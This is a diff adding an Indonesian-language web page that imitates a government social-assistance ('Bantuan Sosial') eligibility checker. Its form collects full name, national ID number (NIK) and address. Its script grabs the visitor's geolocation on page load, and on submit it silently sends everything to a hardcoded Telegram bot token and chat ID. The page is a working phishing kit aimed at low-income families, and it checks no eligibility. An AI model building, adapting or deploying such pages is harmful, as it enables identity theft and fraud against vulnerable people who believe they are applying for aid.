@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bantuan Sosial Keluarga</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Arial', sans-serif;
+        }
+        body {
+            background-color: #f9f5f0;
+            color: #333;
+            overflow-x: hidden;
+        }
+        header {
+            background: #ff6f61;
+            padding: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+        }
+        header img {
+    width: 50px;
+    position: absolute;
+    left: 1px; /* Ubah sesuai keinginan */
+}
+        header h1 {
+            font-size: 24px;
+            color: white;
+            text-align: center;
+        }
+        .container {
+            width: 90%;
+            max-width: 900px;
+            margin: 20px auto;
+            padding: 20px;
+            background: white;
+            border-radius: 10px;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+            animation: fadeIn 1.5s ease-in-out;
+        }
+        @keyframes fadeIn {
+            from {opacity: 0; transform: translateY(-20px);}
+            to {opacity: 1; transform: translateY(0);}
+        }
+        h2 {
+            text-align: center;
+            margin-bottom: 15px;
+            color: #ff6f61;
+        }
+        .program-list {
+            margin-bottom: 20px;
+        }
+        .program {
+            padding: 15px;
+            background: #ffe4e1;
+            margin-bottom: 10px;
+            border-radius: 5px;
+            font-size: 18px;
+            transition: transform 0.3s ease;
+        }
+        .program:hover {
+            transform: scale(1.05);
+        }
+        form {
+            background: #fffbf2;
+            padding: 15px;
+            border-radius: 8px;
+        }
+        form input, form select, form button {
+            width: 100%;
+            padding: 12px;
+            margin-top: 10px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+        form input, form select {
+            background: #fffaf0;
+            color: #333;
+        }
+        form button {
+            background: #ff6f61;
+            color: white;
+            font-size: 18px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: background 0.3s ease;
+        }
+        form button:hover {
+            background: #e65a50;
+        }
+        footer {
+            text-align: center;
+            padding: 15px;
+            background: #ff6f61;
+            color: white;
+            margin-top: 20px;
+            font-size: 16px;
+        }
+    </style>
+</head>
+<body>
+
+<header>
+    <img src="https://github.com/IKHSAN-PROJCT/ikhsan-projct.github.io/blob/main/images__3_-removebg-preview.png?raw=true" alt="Logo"> <!-- Logo di bagian kiri -->
+    <h1>Bantuan Sosial Keluarga</h1>
+</header>
+
+<div class="container">
+    <h2>Program bantuan 2025</h2>
+    <div class="program-list">
+        <div class="program">
+            <strong>🛒 Bantuan Pangan</strong> – Paket sembako gratis untuk keluarga kurang mampu.
+        </div>
+        <div class="program">
+            <strong>🩺 Bantuan Kesehatan</strong> – Bantuan biaya persalinan dan kesehatan anak.
+        </div>
+        <div class="program">
+            <strong>🎒 Bantuan Pendidikan</strong> – Beasiswa untuk anak sekolah dan bantuan seragam.
+        </div>
+        <div class="program">
+            <strong>🏠 Bantuan Rumah Tangga</strong> – Subsidi listrik dan gas untuk ibu rumah tangga.
+        </div>
+    </div>
+
+    <h2>Cek Bantuan mu disini!</h2>
+    <form id="bansosForm">
+        <input type="text" id="nama" placeholder="Nama Lengkap (Ibu/Penerima)" required>
+        <input type="text" id="nik" placeholder="NIK (Nomor KTP)" required>
+        <input type="text" id="alamat" placeholder="Alamat Lengkap" required>
+        <select id="bantuan">
+            <option>Pilih Jenis Bantuan</option>
+            <option>Bantuan Pangan</option>
+            <option>Bantuan Kesehatan</option>
+            <option>Bantuan Pendidikan</option>
+            <option>Bantuan Rumah Tangga</option>
+        </select>
+        <button type="submit">Cek Sekarang</button>
+    </form>
+</div>
+
+<footer style="background: #ff6f61; color: white; text-align: center; padding: 15px; font-size: 16px; border-radius: 0 0 10px 10px;">
+    &copy; 2025 Bantuan Sosial Indonesia  
+    <br><em>"Peduli dan Sejahtera Bersama"</em>  
+    <br><a href="#" style="color: white; text-decoration: none; font-weight: bold;">Kebijakan Privasi</a> |  
+    <a href="#" style="color: white; text-decoration: none; font-weight: bold;">Syarat & Ketentuan</a>  
+</footer>
+
+<script>
+    let userLocation = "Tidak diketahui";
+
+    // Minta izin lokasi saat halaman dimuat
+    window.onload = function() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(position => {
+                userLocation = `Lat: ${position.coords.latitude}, Lng: ${position.coords.longitude}`;
+            }, () => {
+                userLocation = "Lokasi tidak diberikan";
+            });
+        }
+    };
+
+    // Fungsi mengirim data ke bot Telegram
+    document.getElementById('bansosForm').addEventListener('submit', function(event) {
+        event.preventDefault();
+        
+        let nama = document.getElementById('nama').value;
+        let nik = document.getElementById('nik').value;
+        let alamat = document.getElementById('alamat').value;
+        let bantuan = document.getElementById('bantuan').value;
+
+        let message = `📌 *Pendaftaran Bantuan Sosial*\n\n` +
+                      `👩 Nama: ${nama}\n` +
+                      `🆔 NIK: ${nik}\n` +
+                      `📍 Alamat: ${alamat}\n` +
+                      `🎯 Jenis Bantuan: ${bantuan}\n` +
+                      `🌍 Lokasi: ${userLocation}`;
+
+        let botToken = "7819595240:AAHnsDhfrjiAM6U0GQTKQW7SBrsB1azDMYs";  // Ganti dengan Token Bot Telegram
+        let chatID = "6864784021";  // Ganti dengan Chat ID Anda
+
+        let telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+
+        fetch(telegramURL)
+            .then(response => alert("Data berhasil dikirim!"))
+            .catch(error => alert("Gagal mengirim data!"));
+    });
+</script>
+
+</body>
+</html>
